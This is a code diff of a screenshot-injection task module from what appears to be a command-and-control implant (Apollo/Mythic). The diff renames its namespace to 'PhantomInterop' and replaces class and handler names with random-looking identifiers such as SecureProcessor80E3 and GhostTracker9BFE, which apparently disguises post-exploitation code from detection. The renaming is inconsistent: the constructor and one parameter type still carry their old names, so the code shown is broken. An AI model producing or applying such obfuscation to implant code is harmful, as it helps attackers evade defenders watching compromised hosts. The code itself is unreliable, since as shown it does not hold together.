@@ -6,14 +6,14 @@
 
 #if SCREENSHOT_INJECT
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Enums.PhantomEnums;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Serializers;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -26,10 +26,10 @@ using ST = System.Threading.Tasks;
 
 namespace Tasks
 {
-    public class screenshot_inject : Tasking
+    public class SecureProcessor80E3 : Tasking
     {
         [DataContract]
-        internal struct ScreenshotInjectParameters
+        internal struct GhostTracker9BFE
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -59,7 +59,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public screenshot_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public screenshot_inject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _sendAction = (object p) =>
             {
@@ -123,8 +123,8 @@ namespace Tasks
             try
             {
                 ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                    string.IsNullOrEmpty(parameters.PipeName))
+                if (ValidationHelper.IsStringEmpty(parameters.LoaderStubId) ||
+                    ValidationHelper.IsStringEmpty(parameters.PipeName))
                 {
                     resp = CreateTaskResponse(
                         $"One or more required arguments was not provided.",
@@ -244,19 +244,19 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
+        private void IntelligentAdapterAD76(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
             _senderEvent.Set();
         }
 
-        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
+        private void RobustProvider017A(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
             System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _cancellationToken.Token);
         }
 
-        private void OnAsyncMessageSent(IAsyncResult result)
+        private void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             // Potentially delete this since theoretically the sender Task does everything
@@ -270,7 +270,7 @@ namespace Tasks
             }
         }
 
-        private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        private void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
@@ -285,7 +285,7 @@ namespace Tasks
             MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        private void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
